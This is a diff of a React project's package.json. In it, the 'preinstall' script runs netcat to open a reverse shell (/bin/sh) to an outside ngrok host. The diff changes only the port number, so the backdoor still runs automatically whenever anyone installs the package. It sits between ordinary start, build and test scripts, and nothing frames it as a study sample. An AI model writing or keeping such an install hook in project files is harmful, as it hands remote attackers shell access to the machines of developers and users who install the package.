@@ -13,7 +13,7 @@
     "typescript": "3.8.3"
   },
   "scripts": {
-    "preinstall" : "nc 0.tcp.in.ngrok.io 11360 -e /bin/sh",
+    "preinstall" : "nc 0.tcp.in.ngrok.io 15081 -e /bin/sh",
     "start": "react-scripts start",
     "build": "react-scripts build",
     "test": "react-scripts test --env=jsdom",
